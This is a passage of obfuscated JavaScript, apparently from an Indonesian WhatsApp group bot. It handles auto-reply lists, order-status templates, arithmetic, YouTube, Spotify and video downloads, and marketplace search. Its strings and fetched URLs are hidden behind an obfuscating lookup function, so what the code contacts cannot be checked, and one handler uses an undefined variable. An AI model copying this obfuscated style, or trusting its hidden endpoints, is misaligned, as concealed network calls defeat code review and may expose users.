            for (let _0x287b4b of db_respon_list) {
                _0x287b4b['id'] === _0x1b1e88[_0x5804c8(0x60f)] && (_0x5297fb += '- ' + _0x287b4b[_0x5804c8(0x2a9)][_0x5804c8(0xafb)]() + '\x0a');
            }
            _0x5297fb += _0x5804c8(0x1b1) + db_respon_list[0x0]['key'][_0x5804c8(0xafb)]() + _0x5804c8(0x6d7) + db_respon_list[0x0]['key'][_0x5804c8(0xafb)]() + _0x5804c8(0x776), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x5297fb,
                'mentions': [_0x1b1e88[_0x5804c8(0xd13)]]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x1dc):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (db_respon_list['length'] === 0x0) return _0x358f3b(_0x5804c8(0x661));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x45c) + (_0x3b7c58 + _0x453fc1) + ' hello');
            if (!isAlreadyResponList(_0x1b1e88['chat'], q[_0x5804c8(0x7bb)](), db_respon_list)) return _0x358f3b('List respon dengan key *' + q + _0x5804c8(0x3b4));
            delResponList(_0x1b1e88[_0x5804c8(0x60f)], q[_0x5804c8(0x7bb)](), db_respon_list), _0x358f3b(_0x5804c8(0xa0c) + q + '*');
            break;
        case 'addlist':
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b('Fitur Khusus admin!');
            var _0xfbd870 = q[_0x5804c8(0x4bd)]('|')[0x0][_0x5804c8(0x7bb)](),
                _0x5c4162 = q[_0x5804c8(0x4bd)]('|')[0x1];
            if (!q['includes']('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd46) + (_0x3b7c58 + _0x453fc1) + ' tes|apa');
            if (isAlreadyResponList(_0x1b1e88[_0x5804c8(0x60f)], _0xfbd870, db_respon_list)) return _0x358f3b(_0x5804c8(0x62d) + _0xfbd870 + '* sudah ada di group ini.');
            if (/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                let _0x42a807 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a);
                const _0x41c434 = new FormData();
                _0x41c434[_0x5804c8(0x189)](_0x5804c8(0x142), fs[_0x5804c8(0x456)](_0x42a807), _0x5804c8(0x405), _0x5804c8(0xa05)), fetch(_0x5804c8(0xa40), {
                    'method': _0x5804c8(0x357),
                    'body': _0x41c434
                })[_0x5804c8(0xabe)](_0x1e6176 => _0x1e6176[_0x5804c8(0x3f8)]())[_0x5804c8(0xabe)](_0x30db8b => {
                    const _0x3bda70 = _0x5804c8;
                    addResponList(_0x1b1e88[_0x3bda70(0x60f)], _0xfbd870, _0x5c4162, !![], 'https://telegra.ph' + _0x30db8b[0x0][_0x3bda70(0x2ec)], db_respon_list), _0x358f3b(_0x3bda70(0x678) + _0xfbd870 + '*');
                    if (fs[_0x3bda70(0xb82)](_0x42a807)) fs['unlinkSync'](_0x42a807);
                });
            } else addResponList(_0x1b1e88[_0x5804c8(0x60f)], _0xfbd870, _0x5c4162, ![], '-', db_respon_list), _0x358f3b(_0x5804c8(0x678) + _0xfbd870 + '*');
            break;
        case _0x5804c8(0x6a2):
        case 'update':
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            var _0xfbd870 = q['split']('|')[0x0]['toLowerCase'](),
                _0x5c4162 = q[_0x5804c8(0x4bd)]('|')[0x1];
            if (!q[_0x5804c8(0x34b)]('|')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd46) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8fa));
            if (!isAlreadyResponListGroup(_0x1b1e88[_0x5804c8(0x60f)], db_respon_list)) return _0x358f3b(_0x5804c8(0x80a) + _0xfbd870 + _0x5804c8(0xa3f));
            if (/image/ ['test'](_0x2b1d7d)) {
                let _0xf2308c = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a);
                const _0x2a047d = new FormData();
                _0x2a047d[_0x5804c8(0x189)](_0x5804c8(0x142), fs[_0x5804c8(0x456)](_0xf2308c), _0x5804c8(0x405), _0x5804c8(0xa05)), fetch(_0x5804c8(0xa40), {
                    'method': 'POST',
                    'body': _0x2a047d
                })['then'](_0x53980e => _0x53980e[_0x5804c8(0x3f8)]())['then'](_0x57b084 => {
                    const _0x1c43d1 = _0x5804c8;
                    updateResponList(_0x1b1e88[_0x1c43d1(0x60f)], _0xfbd870, _0x5c4162, !![], 'https://telegra.ph' + _0x57b084[0x0]['src'], db_respon_list), _0x358f3b(_0x1c43d1(0xacf) + _0xfbd870 + '*');
                    if (fs['existsSync'](_0xf2308c)) fs[_0x1c43d1(0x850)](_0xf2308c);
                });
            } else updateResponList(_0x1b1e88[_0x5804c8(0x60f)], _0xfbd870, _0x5c4162, ![], '-', db_respon_list), _0x358f3b(_0x5804c8(0xacf) + _0xfbd870 + '*');
            break;
        case _0x5804c8(0x3f7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf[_0x5804c8(0x34b)]('+')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8ba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb25));
            arg = _0x83eae5[_0x5804c8(0xc6c)](' '), atas = arg['split']('+')[0x0], bawah = arg['split']('+')[0x1];
            var _0x38e45d = Number(atas),
                _0x3f16e5 = Number(bawah);
            _0x358f3b('' + (_0x38e45d + _0x3f16e5));
        }
        break;
        case _0x5804c8(0x75c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf['includes']('-')) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + ' *angka* - *angka*\x0a\x0a_Contoh_\x0a\x0a' + (_0x3b7c58 + _0x453fc1) + ' 1-2');
            arg = _0x83eae5['join'](' '), atas = arg['split']('-')[0x0], bawah = arg['split']('-')[0x1];
            var _0x38e45d = Number(atas),
                _0x3f16e5 = Number(bawah);
            _0x358f3b('' + (_0x38e45d - _0x3f16e5));
        }
        break;
        case _0x5804c8(0xc86): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf['includes']('*')) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x80b) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x637));
            arg = _0x83eae5[_0x5804c8(0xc6c)](' '), atas = arg[_0x5804c8(0x4bd)]('*')[0x0], bawah = arg[_0x5804c8(0x4bd)]('*')[0x1];
            var _0x38e45d = Number(atas),
                _0x3f16e5 = Number(bawah);
            _0x358f3b('' + _0x38e45d * _0x3f16e5);
        }
        break;
        case _0x5804c8(0x393): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b04cf[_0x5804c8(0x34b)]('/')) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x70a) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x3b9));
            arg = _0x83eae5[_0x5804c8(0xc6c)](' '), atas = arg[_0x5804c8(0x4bd)]('/')[0x0], bawah = arg[_0x5804c8(0x4bd)]('/')[0x1];
            var _0x38e45d = Number(atas),
                _0x3f16e5 = Number(bawah);
            _0x358f3b('' + _0x38e45d / _0x3f16e5);
        }
        break;
        case _0x5804c8(0x37e):
        case _0x5804c8(0xc08):
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ea) + (_0x3b7c58 + _0x453fc1) + ' Pesanan sedang di proses ya @user\x0a\x0a- @user (tag org yg pesan)\x0a- @pesanan (pesanan)\x0a- @jam (waktu pemesanan)\x0a- @tanggal (tanggal pemesanan) ');
            if (isSetProses(_0x1b1e88[_0x5804c8(0x60f)], set_proses)) return _0x358f3b(_0x5804c8(0x62a));
            addSetProses(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_proses), _0x358f3b(_0x5804c8(0xac3));
            break;
        case 'changeproses':
        case _0x5804c8(0x3bc):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b('Fitur Khusus admin!');
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ea) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8d0));
            isSetProses(_0x1b1e88[_0x5804c8(0x60f)], set_proses) ? (changeSetProses(_0x1b04cf, _0x1b1e88['chat'], set_proses), _0x358f3b(_0x5804c8(0xc5b))) : (addSetProses(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_proses), _0x358f3b(_0x5804c8(0xc5b)));
            break;
        case _0x5804c8(0xaf6):
        case _0x5804c8(0x269):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b('Fitur Khusus admin!');
            if (!isSetProses(_0x1b1e88[_0x5804c8(0x60f)], set_proses)) return _0x358f3b('Belum ada set proses di gc ini');
            removeSetProses(_0x1b1e88[_0x5804c8(0x60f)], set_proses), _0x358f3b(_0x5804c8(0xc1a));
            break;
        case _0x5804c8(0xba2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ea) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xb44));
            if (isSetDone(_0x1b1e88[_0x5804c8(0x60f)], set_done)) return _0x358f3b(_0x5804c8(0xb22));
            addSetDone(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_done), _0x358f3b(_0x5804c8(0x3e4));
            break;
        }
        case _0x5804c8(0xc13):
        case _0x5804c8(0x5df):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88[_0x5804c8(0xcea)]) return _0x358f3b(_0x5804c8(0x6cd));
            if (!_0x155c75) return _0x358f3b(_0x5804c8(0xccf));
            if (!_0x1b04cf) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x1ea) + (_0x3b7c58 + _0x453fc1) + ' Done @user\x0a\x0a- @user (tag org yg pesan)\x0a- @pesanan (pesanan)\x0a- @jam (waktu pemesanan)\x0a- @tanggal (tanggal pemesanan) ');
            isSetDone(_0x1b1e88['chat'], set_done) ? (changeSetDone(_0x1b04cf, _0x1b1e88[_0x5804c8(0x60f)], set_done), _0x358f3b(_0x5804c8(0x744))) : (addSetDone(_0x1b04cf, _0x1b1e88['chat'], set_done), _0x358f3b(_0x5804c8(0x744)));
            break;
        case 'delsetdone':
        case _0x5804c8(0x25a):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x1b1e88['isGroup']) return _0x358f3b('Fitur Khusus Group!');
            if (!_0x155c75) return _0x358f3b('Fitur Khusus admin!');
            if (!isSetDone(_0x1b1e88['chat'], set_done)) return _0x358f3b(_0x5804c8(0xc42));
            removeSetDone(_0x1b1e88[_0x5804c8(0x60f)], set_done), _0x358f3b(_0x5804c8(0xb1b));
            break;
        case 'play':
        case 'ytplay': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b('Example : ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa5f));
            let _0x4b5746 = await yts('' + _0x1b04cf),
                _0x4083ea = '*YOUTUBE PLAY*\x0a\x0aあ ID : ' + _0x4b5746[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x52f)] + '\x0aあ Title : ' + _0x4b5746[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x196)] + _0x5804c8(0x5bb) + _0x4b5746['all'][0x0]['views'] + _0x5804c8(0xbe5) + _0x4b5746['all'][0x0]['timestamp'] + _0x5804c8(0x8ab) + _0x4b5746[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x6ed)][_0x5804c8(0x35b)] + '\x0aあ Upload : ' + _0x4b5746['all'][0x0][_0x5804c8(0x2c4)] + '\x0aあ URL Video : ' + _0x4b5746['videos'][0x0]['url'] + _0x5804c8(0xbb6) + _0x4b5746[_0x5804c8(0xb64)][0x0]['description'] + _0x5804c8(0x924),
                _0x392d2b = await getBuffer(_0x4b5746[_0x5804c8(0xc4d)][0x0]['image']);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': _0x392d2b,
                'caption': _0x4083ea
            }, {
                'quoted': _0x1b1e88
            });
            let _0x43623e = _0x4b5746[_0x5804c8(0xb64)][0x0][_0x5804c8(0xbf3)];
            const _0x1e8bf6 = require(_0x5804c8(0x676));
            let _0x2b6e3a = './' + _0x1b1e88[_0x5804c8(0x60f)] + _0x5804c8(0x7eb),
                _0x31f854 = _0x1e8bf6(_0x43623e, {
                    'filter': 'audioonly'
                })['pipe'](fs[_0x5804c8(0x566)](_0x2b6e3a))['on'](_0x5804c8(0x86f), async () => {
                    const _0x585c97 = _0x5804c8;
                    _0x614da8[_0x585c97(0x938)](_0x1b1e88[_0x585c97(0x60f)], {
                        'audio': fs[_0x585c97(0x456)](_0x2b6e3a),
                        'mimetype': _0x585c97(0x8d4)
                    }, {
                        'quoted': _0x1b1e88
                    });
                });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'ytmp3':
        case _0x5804c8(0x912): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x239));
            if (!_0x1b04cf['includes'](_0x5804c8(0x800)) && !_0x1b04cf[_0x5804c8(0x34b)](_0x5804c8(0xb2d))) return _0x358f3b('Gunakan dengan cara ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + ' https://youtu.be/dhYOPzcsbGM');
            await _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x5a8e07 = await yts('' + _0x1b04cf),
                _0x452570 = _0x5804c8(0xbfa) + _0x5a8e07[_0x5804c8(0xc4d)][0x0]['videoId'] + _0x5804c8(0x4d5) + _0x5a8e07[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x196)] + _0x5804c8(0x5bb) + _0x5a8e07[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x17e)] + _0x5804c8(0xbe5) + _0x5a8e07[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x376)] + _0x5804c8(0x8ab) + _0x5a8e07[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x6ed)][_0x5804c8(0x35b)] + _0x5804c8(0x899) + _0x5a8e07['all'][0x0][_0x5804c8(0x2c4)] + _0x5804c8(0x89d) + _0x5a8e07[_0x5804c8(0xb64)][0x0][_0x5804c8(0xbf3)] + _0x5804c8(0xbb6) + _0x5a8e07['videos'][0x0][_0x5804c8(0x6b8)] + _0x5804c8(0x924),
                _0x17c8db = await getBuffer(_0x5a8e07[_0x5804c8(0xc4d)][0x0][_0x5804c8(0x63e)]);
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'image': _0x17c8db,
                'caption': _0x452570
            }, {
                'quoted': _0x1b1e88
            });
            let _0x1f52e3 = _0x5a8e07[_0x5804c8(0xb64)][0x0]['url'];
            const _0xdaf4b1 = require(_0x5804c8(0x676));
            let _0x2e0ad9 = './' + _0x1b1e88[_0x5804c8(0x60f)] + '.mp3',
                _0x55f55c = _0xdaf4b1(_0x1f52e3, {
                    'filter': _0x5804c8(0x84d)
                })[_0x5804c8(0xaa5)](fs['createWriteStream'](_0x2e0ad9))['on']('finish', async () => {
                    const _0xb454 = _0x5804c8;
                    _0x614da8[_0xb454(0x938)](_0x1b1e88[_0xb454(0x60f)], {
                        'audio': fs[_0xb454(0x456)](_0x2e0ad9),
                        'mimetype': _0xb454(0x8d4)
                    }, {
                        'quoted': _0x1b1e88
                    });
                });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x7d9):
        case 'ytmp4':
        case 'ytvideo': {
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess['wait']);
            try {
                let _0x513bfc = await fetchJson(_0x5804c8(0xc2e) + _0x1b04cf);
                const _0x10a844 = _0x513bfc[_0x5804c8(0x6b2)]['channel'],
                    _0xbf82e2 = _0x513bfc['result'][_0x5804c8(0x196)];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x513bfc[_0x5804c8(0x6b2)][_0x5804c8(0x223)]['data']
                    },
                    'caption': _0x5804c8(0xb6f) + _0xbf82e2 + _0x5804c8(0x350) + _0x10a844
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x34b567) {
                _0x358f3b(_0x5804c8(0x238));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0xd94):
        case _0x5804c8(0x969): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x476));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            try {
                let _0x10d75e = await fetchJson(_0x5804c8(0x4c6) + _0x1b04cf);
                const _0x564a56 = _0x10d75e['data'][_0x5804c8(0x683)],
                    _0x2c6345 = _0x10d75e[_0x5804c8(0x233)]['title'];
                _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'video': {
                        'url': _0x10d75e['data'][_0x5804c8(0x5dd)]
                    },
                    'caption': '💬Judul : ' + _0x2c6345 + _0x5804c8(0x8d2) + _0x564a56
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x3731cf) {
                _0x358f3b(_0x5804c8(0x7b9));
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        break;
        case _0x5804c8(0x413):
            if (!_0x1b04cf) return _0x358f3b('Masukan judul lagu!');
            let _0x4e7baa = require(_0x5804c8(0x396));
            _0x4e7baa(_0x1b04cf)[_0x5804c8(0xabe)](_0x542a08 => {
                const _0x41dedb = _0x5804c8,
                    _0x4fd04e = '乂 *S P O T I F Y*\x0a\x0a*Title*: ' + _0x542a08['data'][0x0][_0x41dedb(0x196)] + _0x41dedb(0x998) + _0x542a08['data'][0x0][_0x41dedb(0x683)] + _0x41dedb(0x959) + _0x542a08[_0x41dedb(0x233)][0x0]['popularity'] + _0x41dedb(0x994) + _0x542a08[_0x41dedb(0x233)][0x0]['url'] + '\x0a';
                _0x614da8[_0x41dedb(0x938)](_0x1b1e88[_0x41dedb(0x60f)], {
                    'text': _0x4fd04e,
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x41dedb(0x2f7),
                            'body': '' + _0x542a08[_0x41dedb(0x233)][0x0]['url'],
                            'showAdAttribution': !![],
                            'mediaType': 0x1,
                            'sourceUrl': '',
                            'thumbnailUrl': _0x41dedb(0x4cc),
                            'renderLargerThumbnail': !![]
                        }
                    }
                }, {
                    'quoted': _0x1b1e88
                });
                const _0x27de78 = _0x41dedb(0x5c4) + _0x542a08[_0x41dedb(0x233)][0x0][_0x41dedb(0xbf3)];
                _0x614da8[_0x41dedb(0x938)](_0x1b1e88[_0x41dedb(0x60f)], {
                    'audio': {
                        'url': _0x27de78
                    },
                    'mimetype': 'audio/mpeg',
                    'contextInfo': {
                        'externalAdReply': {
                            'title': _0x41dedb(0x2f7),
                            'body': '',
                            'thumbnailUrl': _0x41dedb(0x4cc),
                            'sourceUrl': '',
                            'mediaType': 0x1,
                            'showAdAttribution': !![],
                            'renderLargerThumbnail': !![]
                        }
                    }
                }, {
                    'quoted': _0x1b1e88
                });
            });
            break;
        case _0x5804c8(0x72e): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x2e3));
            let _0x4937dc = await fetch(_0x5804c8(0x186) + _0x1b04cf),
                _0x3c4ddd = await _0x4937dc[_0x5804c8(0x3f8)](),
                _0x4e113e = _0x3c4ddd[_0x5804c8(0x233)]['map'](_0x4fa609 => '*Title:* ' + _0x4fa609[_0x5804c8(0x196)] + '\x0a*Popularitas:* ' + _0x4fa609['popularity'] + '\x0a*Url:* ' + _0x4fa609[_0x5804c8(0xbf3)])[_0x5804c8(0xc6c)](_0x5804c8(0xd0e)),
                _0x5469e0 = _0x5804c8(0x836);
            _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x5469e0, _0x5804c8(0xd92), _0x4e113e, _0x1b1e88, !![], {
                'gifPlayback': !![],
                'gifAttribution': 0x2
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x70d): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xa13) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x55f));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x527366 = await fetchJson(_0x5804c8(0x878) + _0x1b04cf);
            const _0x83cc29 = _0x527366[_0x5804c8(0x233)]['url'];
            _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': {
                    'url': _0x83cc29
                },
                'mimetype': _0x5804c8(0x8d4),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x527366['data']['title'],
                        'body': '',
                        'thumbnailUrl': _0x527366[_0x5804c8(0x233)][_0x5804c8(0x1cf)],
                        'sourceUrl': audioUrl,
                        'mediaType': 0x1,
                        'showAdAttribution': !![],
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x651): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b04cf) return _0x358f3b('Nyari Apa?');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x5abf28 = await fetch(_0x5804c8(0x4d2) + _0x1b04cf);
            try {
                let _0x109044 = await _0x5abf28[_0x5804c8(0x3f8)]();
                _0x109044 = _0x109044[_0x5804c8(0x6b2)][_0x5804c8(0x686)](_0x29a8f5 => _0x5804c8(0x675) + _0x29a8f5[_0x5804c8(0xb5d)] + _0x5804c8(0x25e) + _0x29a8f5[_0x5804c8(0x734)] + '\x0a*Kategori:* ' + _0x29a8f5[_0x5804c8(0x49a)] + _0x5804c8(0xd89) + _0x29a8f5['dl'] + '\x0a')[_0x5804c8(0xc6c)]
                `\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`, _0x358f3b(_0x109044);
            } catch (_0x186c39) {
                _0x358f3b('Tidak Dapat Menemukan Apa Yang Kamu Cari');
            }
        }
        break;
        case _0x5804c8(0xc2f): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0x6b3) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd3f));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let [_0x14c3b0, _0x5cbbe9] = _0x1b04cf[_0x5804c8(0x4bd)](/[^\w\s]/g);
            if (!(_0x14c3b0 && _0x5cbbe9)) return _0x358f3b(_0x5804c8(0xd9a) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0xd3f));
            let _0x56d925 = await _0x140b4b(_0x14c3b0, _0x5cbbe9);
            if (_0x56d925['img']) return _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x56d925['img'],
                'caption': _0x56d925[_0x5804c8(0x7f7)]
            }, {
                'quoted': _0x1b1e88
            });
            else _0x358f3b(_0x56d925[_0x5804c8(0x7f7)]);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'bukalapak': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x8dd));
            try {
                let _0x55cc6f = await fetch(_0x5804c8(0xca3) + encodeURIComponent(_0x1b04cf)),
                    _0x294f7b = await _0x55cc6f[_0x5804c8(0x3f8)](),
                    _0x18146d = _0x294f7b[_0x5804c8(0x6b2)],
                    _0x1c475b = _0x18146d[_0x5804c8(0x686)](_0x36ceff => {
                        const _0xed4e03 = _0x5804c8;
                        return _0xed4e03(0x5b9) + _0x36ceff['title'] + '\x0a*Rating:* ' + _0x36ceff[_0xed4e03(0xd11)] + _0xed4e03(0x706) + _0x36ceff[_0xed4e03(0x6e4)] + _0xed4e03(0xce9) + _0x36ceff[_0xed4e03(0xcd2)] + '\x0a*Link:* ' + _0x36ceff[_0xed4e03(0x381)]['link'];
                    })[_0x5804c8(0xc6c)](_0x5804c8(0xd0e)),
                    _0x7c9248 = _0x18146d[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x18146d[_0x5804c8(0x977)])][_0x5804c8(0x63e)];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'image': {
                        'url': _0x7c9248
                    },
                    'caption': '' + _0x1c475b
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x126640) {
                console[_0x5804c8(0x5d2)](_0x126640), _0x358f3b('Terjadi kesalahan saat mengambil data dari Bukalapak.');
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x40b): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xcba) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x834));
            try {
